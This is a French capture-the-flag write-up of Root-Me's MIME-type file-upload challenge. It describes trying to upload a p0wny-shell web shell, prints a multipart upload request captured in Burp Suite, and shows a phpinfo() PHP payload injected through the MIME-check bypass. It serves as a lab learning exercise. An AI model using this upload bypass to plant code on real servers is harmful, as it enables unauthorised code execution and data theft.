### Challenge: File upload - Type MIME

Url :  https://www.root-me.org/fr/Challenges/Web-Serveur/File-upload-Type-MIME

**Enoncé :**
 Votre objectif est de compromettre cette galerie photo en y uploadant du code PHP.
Récupérez le mot de passe de validation dans le fichier .passwd à la racine de l’application.

Writeups: 

**Etape 1 :**

En lisant le pdf fournit par le challenge root me, on nous explique que fournir une fonction de téléchargement de fichiers sans ouvrir de failles de sécurité s'est avéré être un véritable défi dans les applications Web PHP.

Dans un premier temps j'ai donc essayé d'uploader un shell.php proposer par p0wny-shell.

via l'url http://challenge01.root-me.org/web-serveur/ch21/?galerie=pirate 

On constate que les seul fichier authorisés à être uploder sont les .gif .png .jpg

J'ai donc essayé d'uploader le shell.php renomé en shell.php.gif
ce qui n'a pas été concluant non plus car par la suite il m'était impossible de lire le code php.

**Etape 2 :**

Je me suis renseigné sur comment exécuter des commandes en php et pouvoir injecté du php sur un site web et via quel outil. J'ai trouvé qu'il était possible d'utiliser le logiciel Burp Suite dispo sur KAli.

Dans un premier temps j'ai configuré firefox en mode proxy pour que burp suite puisse fonctionner en écoute.

j'ai décidé d'uploader un fichier vide nommé test.gif afin de voir comment était écrite la requète et récupéré dans Burp Suite.

**Exemple  de requète POST après avoir été capturé dans Burp Suite:**
![Dashboardburpsuite](./assets/Dashboardburpsuite.jpg)
![requète POST](./assets/requetePOST.jpg)
```
Host: challenge01.root-me.org

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: multipart/form-data; boundary=---------------------------7953439253655482311709021686

Content-Length: 220

Origin: http://challenge01.root-me.org

Connection: close

Referer: http://challenge01.root-me.org/web-serveur/ch21/?action=upload

Cookie: PHPSESSID=50b7b78eb6d9e9c304557f2d66ebbad8; _ga_SRYSKX09J7=GS1.1.1721738360.4.1.1721739170.0.0.0; _ga=GA1.1.1550943214.1721718478

Upgrade-Insecure-Requests: 1



-----------------------------7953439253655482311709021686

Content-Disposition: form-data; name="file"; filename="test.gif"

Content-Type: image/gif



test


-----------------------------7953439253655482311709021686--
```

Dans la documentation on nous explique qu'il est facilement possible de contourner la vérification MIME. Est vérifie l'extension mais pas le contenue. Il est donc possible de copier du code php ou python et de l'injecté avec "Burp suite".

On peut utiliser:
```
<?php
echo phpinfo();
?>
```
Pour obtenir des informations utiles comme l'open_basedir.
open_basedir	/challenge/web-serveur/ch21






